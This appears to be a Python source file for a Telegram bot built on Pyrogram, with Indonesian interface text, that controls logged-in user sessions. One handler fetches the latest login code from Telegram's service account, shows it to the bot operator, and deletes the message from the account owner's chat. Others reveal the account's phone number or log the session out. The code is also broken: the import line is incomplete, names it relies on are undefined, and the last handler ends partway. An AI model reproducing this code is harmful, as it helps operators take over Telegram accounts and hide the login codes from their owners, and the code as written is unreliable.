from pyrogram import filters
from main import app, 
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton



@app.on_callback_query(filters.regex("^(get_otp|get_phone|hapus_ubot)"))
async def tools(client, callback_query):
    query = callback_query.data.split()
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Kode tidak ditemukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            Button.userbot(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 Nomer telepon <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "hapus_ubot":
        get_mention = f"<b><a href=tg://user?id={X.me.id}>{X.me.id}</a></b>"
        try:
            await X.log_out()
            return await callback_query.edit_message_text(
                f"✅ nokos <code>{X.me.id}</code> sudah dimatikan",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)

@app.on_message(filters.command("setting") & filters.private)
async def setting(client, message):
    text = f"""
"""    
    button = [
        [
            InlineKeyboardButton("Tambah Akun", callback_data="add_akun"),
        ],
        [
           InlineKeyboardButton("Setting", callback_data="setting"),
        ],
    ]
